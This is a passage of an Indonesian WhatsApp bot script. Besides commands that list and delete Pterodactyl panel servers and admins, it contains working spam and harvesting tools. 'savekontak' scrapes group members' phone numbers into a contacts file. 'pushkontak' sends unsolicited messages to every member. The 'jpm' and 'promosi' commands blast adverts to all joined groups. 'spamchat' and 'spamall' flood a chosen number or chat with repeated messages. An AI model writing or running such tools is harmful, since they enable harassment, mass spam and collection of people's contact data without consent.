if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listpanel': case "listp": case 'listserver': {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case 'statuspanel': {  
    if (!isCreator) return Reply(mess.owner);  
    if (!text) return Reply("Masukkan ID panel yang ingin dicek!\nContoh: *.cekstatuspanel 123*");  

    let panelID = text.trim();  

    let f = await fetch(domain + `/api/application/servers/${panelID}`, {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + apikey  
        }  
    });  
    if (f.status !== 200) return Reply("Server dengan ID tersebut tidak ditemukan!");  

    let res = await f.json();  
    let s = res.attributes;  

    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + capikey  
        }  
    });  
    let data = await f3.json();  
    let status = data.attributes ? data.attributes.current_state : "unknown";  

    let messageText = `📡 *Status Server Panel*\n\n` +  
                      `🆔 ID: *${s.id}*\n` +  
                      `📛 Nama: *${s.name}*\n` +  
                      `💾 RAM: *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory + "MB"}*\n` +  
                      `⚙️ CPU: *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu + "%"}*\n` +  
                      `🗂 Disk: *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk + "MB"}*\n` +  
                      `📅 Created: *${s.created_at.split("T")[0]}*\n` +  
                      `🔹 Status: *${status === "running" ? "✅ Online" : "❌ Offline"}*`;  

    await conn.sendMessage(m.chat, {  
        text: messageText,  
        footer: `© 2025 ${botname}`,  
        headerType: 1,  
        viewOnce: true,  
        contextInfo: {  
            isForwarded: true,  
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],  
        },  
    }, {quoted: m});  
}  
break;

case 'totalpanel': {  
    if (!isCreator) return Reply(mess.owner);  
    let f = await fetch(domain + "/api/application/servers?page=1", {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + apikey  
        }  
    });  
    let res = await f.json();  
    let totalServers = res.meta.pagination.total; // Mengambil total jumlah server  

    await conn.sendMessage(m.chat, {  
        text: `Total Server Panel: *${totalServers}*`,  
        footer: `© 2025 ${botname}`,  
        headerType: 1,  
        viewOnce: true,  
        buttons: [
            { buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
        ],
        contextInfo: {  
            isForwarded: true,   
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"],   
        },  
    }, {quoted: m});  
}  
break;

case 'totaluser': {  
    if (!isCreator) return Reply(mess.owner);  
    let f = await fetch(domain + "/api/application/users", {  
        "method": "GET",  
        "headers": {  
            "Accept": "application/json",  
            "Content-Type": "application/json",  
            "Authorization": "Bearer " + apikey  
        }  
    });  
    let res = await f.json();  
    let totalUsers = res.meta.pagination.total; // Mengambil total jumlah user  

    await conn.sendMessage(m.chat, {  
        text: `Total User Panel: *${totalUsers}*`,  
        footer: `© 2025 ${botname}`,  
        headerType: 1,  
        viewOnce: true,  
        contextInfo: {  
            isForwarded: true,   
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"],   
        },  
    }, {quoted: m});  
}  
break;  

case 'totaladmin': {
    if (!isCreator) return Reply(mess.owner)
    
    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    
    let res2 = await cek.json();
    let users = res2.data;
    
    if (users.length < 1) return m.reply("Tidak ada admin panel")
    
    // Menghitung total admin
    let totalAdmin = users.filter(user => user.attributes.root_admin === true).length;

    let teks = `*乂 Total Admin Panel Pterodactyl*\n\nTotal Admin: ${totalAdmin}`

    await conn.sendMessage(m.chat, {
        text: teks,
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        buttons: [
            { buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 },
            { buttonId: `.listadmin`, buttonText: { displayText: 'Lihat Semua Admin' }, type: 1 }
        ],
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
        },
    }, {quoted: m})
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'deladmin': {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delpanel': {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'produk': case "list": {
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Berikut adalah list produk\n"
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'savekontak': {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await conn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Rapszio - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'savekontak2': {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Rapszio - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'pushkontak': {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await conn.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'respushkontak': {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await conn.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'pushkontak2': {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await conn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'jpmslide': {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'jpmslidehidetag': case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'bayar': {    
    if (!isCreator) return Reply(mess.owner);    

    let args = text.split(' ');
    let u = m.quoted ? m.quoted.sender : args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];    
    let jumlah = args[1] ? parseInt(args[1]) : null;

    if (!u || !jumlah) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Penggunaan:*\n${prefix + command} <nomor> <jumlah>\n\n🔹 Contoh:\n${prefix + command} 6281234567890 50000`);
    }

    let pesan = `💰 *_Pembayaran tersedia melalui:_* 💰\n\n` +  
                `📌 *DANA* : ${global.dana}\n` +  
                `📌 *OVO* : ${global.ovo}\n` +  
                `📌 *GoPay* : ${global.gopay}\n` +  
                `📌 *QRIS* : Scan QRIS di atas ini atau ketik *.deposit*\n\n` +
                `✅ Silakan transfer sebesar *Rp ${jumlah.toLocaleString()}*.\nJika sudah transfer, mohon kirim bukti ke developer kami, dengan cara ketik *.bukti*.!! Terima kasih! 🙏\n\n© 2025 ${global.botname2}`;  

    // Mengirim pesan ke nomor yang dituju    
    conn.sendMessage(u, { 
        image: { url: global.image.qris }, 
        caption: pesan 
    }, { quoted: m })    
    .then(() => {    
        Reply('✅ *Sukses terkirim!* 🚀');    
    })    
    .catch(err => {    
        Reply('❌ *Gagal mengirim pesan!* 😢');    
    });    
}    
break;

case 'pesan':
case 'chat': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return Reply(`*Format salah!*\nPenggunaan:\n${prefix + command} text,nomer`);
    
    let chat = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    
    // Mengirim pesan ke nomor yang dituju
    conn.sendMessage(u, { text: chat }, { quoted: qtext2 })
        .then(() => {
            // Kirim pesan sukses setelah pesan berhasil terkirim
            Reply('Sukses Terkirim');
        })
        .catch(err => {
            // Menangani error jika pengiriman pesan gagal
            Reply('Gagal Mengirim Pesan');
        });
}
break;

case 'spamall': {
    // Cek apakah pengguna adalah admin atau pembuat bot
    if (!isCreator) return Reply(mess.owner);

    // Cek apakah ada teks yang akan dikirim
    if (!text) return Reply(`📋 Contoh penggunaan: ${command} <jumlah> | <pesan>`);

    // Memisahkan jumlah dan teks pesan
    const [jumlah, ...pesan] = text.split('|').map(v => v.trim());
    const jumlahSpam = parseInt(jumlah);

    // Validasi jumlah pesan
    if (isNaN(jumlahSpam) || jumlahSpam <= 0) 
        return Reply(`❌ Masukkan jumlah pesan yang valid (contoh: ${command} 5 | Pesan Anda).`);

    if (!pesan.length) 
        return Reply(`❌ Masukkan jumlah pesan yang valid (contoh: ${command} 5 | Pesan Anda).`);

    // Pesan yang akan dikirim
    const isiPesan = pesan.join(" ");

    // Loop untuk mengirim pesan sesuai jumlah
    for (let i = 0; i < jumlahSpam; i++) {
        await conn.sendMessage(m.chat, { text: `${isiPesan}` }, { quoted: qtext2 });
    }

    // Hapus atau komentar bagian ini agar tidak ada pesan sukses
    // Reply(`✅ Pesan berhasil dikirim sebanyak ${jumlahSpam} kali!`);
}
break;

case 'spampesan':
case 'spamchat': {
    if (!isCreator) return Reply(mess.owner);
    
    let t = text.split(',');
    if (t.length < 3) return Reply(`*Format salah!*\nPenggunaan:\n${prefix + command} text,nomor,jumlah`);
    
    let chat = t[0].trim(); // Pesan yang akan dikirim
    let targetNumber = t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // Nomor tujuan
    let jumlah = parseInt(t[2].trim()); // Jumlah pesan yang akan dikirim
    
    if (isNaN(jumlah) || jumlah <= 0) return Reply('Jumlah pesan harus berupa angka positif!');

    let sendMessages = async () => {
        for (let i = 0; i < jumlah; i++) {
            try {
                await conn.sendMessage(targetNumber, { text: chat }, { quoted: qtext2 });
            } catch (err) {
                return Reply(`Gagal mengirim pesan ke ${targetNumber}`);
            }
        }
        Reply(`Sukses mengirim ${jumlah} pesan ke ${targetNumber}`);
    };

    sendMessages();
}
break;

case 'pushjpm': {
    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: 'ini pesan interactiveMeta' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Fitur Jpm Yang Tersedia',
                        sections: [
                            {
                                title: '📢 PROMOSI FITUR KE GROUP',
                                rows: [
                                    { title: 'PROMOSI JUALAN ANDA', description: 'Tawarkan produk Anda ke grup WhatsApp.', id: '.promosi' },
                                    { title: 'PROMOSI ADMIN PANEL ANDA', description: 'Promosikan admin panel kepada anggota grup.', id: '.pmadp' },
                                    { title: 'PROMOSI SC SIMPLE BOT V4', description: 'Promosikan script Simple Bot V4 di grup.', id: '.pmsc' },
                                    { title: 'PROMOSI SC SIMPLE BOT V5', description: 'Promosikan script Simple Bot V5 di grup.', id: '.pmsc3' },
                                    { title: 'PROMOSI SC RAFATHARCODE V5', description: 'Promosikan script RafatharCode V5 di grup.', id: '.pmsc1' },
                                    { title: 'PROMOSI SC BUTTON ORDERKUOTA V2', description: 'Promosikan script Button OrderKuota V2 di grup.', id: '.pmsc2' }
                                ]
                            },
                            {
                                title: '📢 PROMOSI FITUR KE CHANNEL',
                                rows: [
                                    { title: 'PROMOSI JUALAN ANDA', description: 'Tawarkan produk Anda ke channel WhatsApp.', id: '.promosi-ch' },
                                    { title: 'PROMOSI ADMIN PANEL ANDA', description: 'Promosikan admin panel ke channel.', id: '.pmadp-ch' },
                                    { title: 'PROMOSI SC SIMPLE BOT V4', description: 'Promosikan script Simple Bot V4 ke channel.', id: '.pmsc-ch' },
                                    { title: 'PROMOSI SC SIMPLE BOT V5', description: 'Promosikan script Simple Bot V5 ke channel.', id: '.pmsc3-ch' },
                                    { title: 'PROMOSI SC RAFATHARCODE V5', description: 'Promosikan script RafatharCode V5 ke channel.', id: '.pmsc1-ch' },
                                    { title: 'PROMOSI SC BUTTON ORDERKUOTA V2', description: 'Promosikan script Button OrderKuota V2 ke channel.', id: '.pmsc2-ch' }
                                ]
                            }
                        ]
                    })
                }
            },
            { buttonId: `.buysc`, buttonText: { displayText: '🛒 Buy Script' }, type: 1 },
            { buttonId: `.owner`, buttonText: { displayText: '📞 Hubungi Developer' }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: global.image.reply }, 
        caption: `\n*▧ I N F O R M A T I O N*\n*• Botname : ${global.botname2}*\n*• Uptime Vps : ${runtime(os.uptime())}*\n*• Total Fitur : ${totalFitur()}*\n\n*Silahkan Pilih Fitur Push Jpm Yang Tersedia Dibawah Ini!!*\n`,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"], 
        }
    }, { quoted: m });
}
break;

case 'promosi': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil

    const teks = `*々 IjulTaka || 乂 Menyediakan*

*»»—— Vps Digital Ocean ——««*
*» Ram 2 Core 1 : 25K*
*» Ram 2 Core 2 : 30K*
*» Ram 4 Core 2 : 40K*
*» Ram 8 Core 4 : 50K*
*» Ram 16 Core 4 : 65K*

*»»—— Benefit Vps ——««*
*» Free Install Panel*
*» Free Protected Panel [Cf]*
*» Free Req Subdomain*
*» Free Install Wings*
*» Free Egg Bot Wa*
*» Free Install Tema [Ram 8,16]*
*» Garansi 15 Days, 1× Replace*

*»»—— Produk Lainnya ——««*
*» Panel Public 1Gb - Unli*
*» Panel Private 1Gb - Unli*
*» Murid Buat Fitur : 50/45K*
*» Domain my.id .tech dll : 10K*
*» Reseller Subdomain : 15K*
*» Murid Subdomain Full Akses Cf : 15K*
*» Jasa Rename Script: 10K*
*» Jasa Fix Script dll*
*» Reseller Panel Public : 10K*
*» Reseller Panel Private : 15K*
*» Admin Panel : 20K*
*» Pt Panel : 50K*
*» Own Panel : 40K*
*» Sc Wa/Tele*
*» Dll Tanyakan*
*» NOTE: BISA GUNAKAN BOT DARI NO DI BAWAH*

*»»—— Contacts Person ——««*
*Wa :* wa.me/62895373974000
*Tele :* t.me/々 IjulTaka || 乂
*Channel :* https://whatsapp.com/channel/0029VaqgmI2Jf05dg5Fweh0T`; 

    const jid = m.chat;
    const gambarDefault = "./pm/promosi.jpg";

    await Reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup ke dalam array suksesGrup
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}`,
        },
        { quoted: qlocJpm }
    );
}
break;

case 'promosi-ch': {
